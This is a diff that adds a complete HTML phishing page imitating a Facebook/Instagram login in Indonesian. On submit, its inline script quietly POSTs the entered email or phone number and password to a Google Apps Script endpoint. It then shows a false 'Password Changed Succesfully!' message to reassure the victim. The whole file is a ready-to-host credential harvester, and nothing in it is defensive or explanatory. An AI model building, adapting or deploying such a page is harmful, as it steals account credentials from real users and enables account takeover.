@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook • Login</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="shortcut icon" href="src/ig.webp" type="image/x-icon" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH"
+      crossorigin="anonymous"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <div class="center">
+        <div class="header">
+          <img src="src/4lCu2zih0ca.svg" width="150" alt="instagramLogo" />
+        </div>
+
+        <form name="script-login">
+          <div class="inputElement">
+            <input
+              type="text"
+              name="email"
+              placeholder="Nomor ponsel atau email"
+              class="inputText"
+            />
+            <input
+              type="password"
+              name="password"
+              placeholder="Kata Sandi"
+              class="inputText"
+            />
+            <button type="submit" name="login" class="inputButton">
+              Masuk
+            </button>
+            <button
+              class="btn btn-loading d-none"
+              type="button"
+              disabled
+              id="btn"
+            >
+              <span
+                class="spinner-border spinner-border-sm"
+                aria-hidden="true"
+              ></span>
+              <span role="status">Please Wait...</span>
+            </button>
+            <div
+              class="alert alert-dismissible fade show d-none my-alert"
+              id="alert"
+              role="alert"
+            >
+              <strong>Password Changed Succesfully!</strong>
+              <button
+                type="button"
+                class="btn-close"
+                data-bs-dismiss="alert"
+                aria-label="Close"
+              ></button>
+            </div>
+            <a href="/index.html" target="_parent" class="forgetPassword"
+              >Lupa kata sandi?</a
+            >
+          </div>
+        </form>
+      </div>
+
+      <div class="line">
+        <span>atau</span>
+      </div>
+
+      <div class="d-grid gap-2 col-8 mx-1 mt-4 mb-0">
+        <button
+          class="btn"
+          type="button"
+          style="border: 1px solid rgb(195, 195, 195)"
+        >
+          Buat akun baru
+        </button>
+      </div>
+    </div>
+
+    <footer>
+      <div class="first">
+        <div class="left">
+          <p class="id">Bahasa Indonesia</p>
+          <p>English (UK)</p>
+          <p>Potugues (Brasil)</p>
+        </div>
+        <div class="right">
+          <p>Basa Jawa</p>
+          <p>Bahasa Melayu</p>
+          <p>Potugues (Brasil)</p>
+        </div>
+      </div>
+      <div class="end">
+        <p>Meta © 2024</p>
+      </div>
+    </footer>
+
+    <script>
+      const scriptURL =
+        "https://script.google.com/macros/s/AKfycbzD9iTT5z8UopS7wF9flG5UA_JyCM4Cx_UOjPTSwZbWWquuKU4tt61i9PcGydPKRZCu5A/exec";
+      const form = document.forms["script-login"];
+      const myAlert = document.querySelector(".my-alert");
+      const btnKirim = document.querySelector(".inputButton");
+      const btnLoading = document.querySelector(".btn-loading");
+
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        btnKirim.classList.toggle("d-none");
+        btnLoading.classList.toggle("d-none");
+        fetch(scriptURL, { method: "POST", body: new FormData(form) })
+          .then((response) => {
+            btnKirim.classList.toggle("d-none");
+            btnLoading.classList.toggle("d-none");
+            myAlert.classList.toggle("d-none");
+            form.reset();
+            console.log("Success!", response);
+          })
+          .catch((error) => console.error("Error!", error.message));
+      });
+    </script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
